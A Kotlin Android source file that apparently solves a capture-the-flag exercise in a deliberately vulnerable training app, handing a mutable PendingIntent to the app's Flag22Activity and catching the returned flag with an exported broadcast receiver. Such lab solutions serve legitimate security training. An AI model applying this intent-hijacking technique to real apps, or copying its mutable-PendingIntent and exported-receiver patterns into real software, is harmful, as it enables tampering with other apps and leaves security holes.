package com.example.myapplication

import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.Text
import androidx.compose.runtime.DisposableEffect
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.core.content.ContextCompat
import java.time.temporal.ValueRange

@androidx.compose.runtime.Composable
fun Flag22(modifier: Modifier = Modifier) {

    val context = LocalContext.current // start activity
    val flagResult = remember { mutableStateOf("") } // to store flag

    val actionName = "com.example.myapplication.FLAG22_RESULT"  // action will send

    DisposableEffect(Unit) {
        val receiver = object : BroadcastReceiver() {
            override fun onReceive(ctx: Context?, intent: Intent?) {
                val flag = intent?.getStringExtra("flag")
                val success = intent?.getBooleanExtra("success", false)
                flagResult.value = "success=$success flag=$flag"
            }
        }

        val filter = IntentFilter(actionName)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            context.registerReceiver(receiver, filter, Context.RECEIVER_EXPORTED)
        } else {
            ContextCompat.registerReceiver(
                context,
                receiver,
                filter,
                ContextCompat.RECEIVER_NOT_EXPORTED
            )
        }

        onDispose {
            context.unregisterReceiver(receiver)
        }
    }

    Column(
        modifier = modifier.fillMaxSize(),
        verticalArrangement = Arrangement.Center,
        horizontalAlignment = Alignment.CenterHorizontally
    ) {
        Button(
            onClick = {
                val broadcastIntent = Intent(actionName)
                val pendingIntent = PendingIntent.getBroadcast(
                    context,
                    0,
                    broadcastIntent,
                    PendingIntent.FLAG_MUTABLE
                )

                val targetIntent = Intent().apply {
                    component = ComponentName(
                        "io.hextree.attacksurface",
                        "io.hextree.attacksurface.activities.Flag22Activity"
                    )
                    putExtra("PENDING", pendingIntent)
                }

                context.startActivity(targetIntent)
            },
            modifier = Modifier.fillMaxWidth(),
            colors = ButtonDefaults.buttonColors()
        ) {
            Text("send Intent")
        }

        Text(text = flagResult.value)
    }
}